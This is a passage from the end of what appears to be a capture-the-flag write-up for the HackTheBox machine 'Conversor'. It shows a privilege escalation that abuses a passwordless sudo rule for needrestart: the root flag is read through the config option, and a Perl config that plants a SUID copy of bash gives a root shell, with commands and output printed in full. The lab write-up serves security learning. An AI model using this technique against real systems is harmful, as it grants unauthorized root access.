+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fismathack@conversor:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>fismathack<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>fismathack<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>fismathack<span class="o">)</span>
+</span></span></code></pre></div><hr>
+<h2 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h2>
+<h3 id="sudo-privileges-analysis">Sudo Privileges Analysis<a hidden class="anchor" aria-hidden="true" href="#sudo-privileges-analysis">#</a></h3>
+<p>Checking sudo permissions reveals critical access:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fismathack@conversor:~$ sudo -l
+</span></span><span class="line"><span class="cl">User fismathack may run the following commands on conversor:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/sbin/needrestart
+</span></span></code></pre></div><h4 id="understanding-needrestart">Understanding Needrestart<a hidden class="anchor" aria-hidden="true" href="#understanding-needrestart">#</a></h4>
+<p>Needrestart is a Debian/Ubuntu utility that detects processes using outdated libraries after system upgrades.
+<img alt="needrestart-gtfobins" loading="lazy" src="/writeups/hackthebox/conversor/screenshots/needrestart_gtfobins.png"></p>
+<p>Key features:</p>
+<ul>
+<li>Scans running processes via /proc</li>
+<li>Maps loaded libraries against upgraded packages</li>
+<li>Can automatically restart affected services</li>
+<li>Configurable via /etc/needrestart/needrestart.conf</li>
+<li>Looking at the help page of the needrestart binary, we can see that it can <strong>read config files</strong>.</li>
+</ul>
+<p>Since we are running the command with sudo privileges, we can point the <code>-c</code> option at <code>/root/root.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/sbin/needrestart -c /root/root.txt
+</span></span></code></pre></div><h4 id="output">Output<a hidden class="anchor" aria-hidden="true" href="#output">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /root/root.txt
+</span></span><span class="line"><span class="cl">Bareword found where operator expected at <span class="o">(</span><span class="nb">eval</span> 14<span class="o">)</span> line 1, near <span class="s2">&#34;4a1*******************&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">(</span>Missing operator before &lt;snip&gt;?<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Error parsing /root/root.txt: syntax error at <span class="o">(</span><span class="nb">eval</span> 14<span class="o">)</span> line 2, near <span class="s2">&#34;4a1*******************
+</span></span></span></code></pre></div><h3 id="alternative-gain-root-shell">Alternative (Gain Root Shell)<a hidden class="anchor" aria-hidden="true" href="#alternative-gain-root-shell">#</a></h3>
+<p>We can create a file with a malicious Perl code that copies <code>/bin/bash</code>
+to <code>/tmp/shell</code> and sets the SUID bit.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;system(&#34;cp /bin/bash /tmp/shell; chmod u+s
+</span></span></span><span class="line"><span class="cl"><span class="s1">/tmp/shell&#34;)&#39;</span> &gt; /tmp/shell.conf
+</span></span></code></pre></div><p>We execute <code>needrestart</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/sbin/needrestart -c /tmp/shell.conf
+</span></span></code></pre></div><p>After execution, the <code>/tmp/shell</code> binary is created with the SUID bit set. We can then run it to obtain a root shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fismathack@conversor:/tmp$ ls -l /tmp/shell
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">1396520</span> Nov <span class="m">12</span> 17:02 /tmp/shell
+</span></span><span class="line"><span class="cl">fismathack@conversor:/tmp$ /tmp/shell -p
+</span></span><span class="line"><span class="cl"><span class="nv">$#</span> id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>fismathack<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>fismathack<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>fismathack<span class="o">)</span>
+</span></span></code></pre></div><hr>
+<h2 id="tools-used">Tools Used<a hidden class="anchor" aria-hidden="true" href="#tools-used">#</a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Tool</th>
+          <th>Purpose</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>nmap</td>
+          <td>Port scanning</td>
+      </tr>
+      <tr>
+          <td>ffuf</td>
+          <td>Directory fuzzing</td>
+      </tr>
+      <tr>
+          <td>hashcat</td>
+          <td>Hash cracking</td>
+      </tr>
+      <tr>
+          <td>nc</td>
+          <td>Reverse shell listener</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<p><strong>Write-up prepared by:</strong> <em>the008killer</em></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/writeups/hackthebox/expressway/">
+    <span class="title">Next »</span>
+    <br>
+    <span>HTB-Expressway</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2026 <a href="http://localhost:1313/">the008Ki11er</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
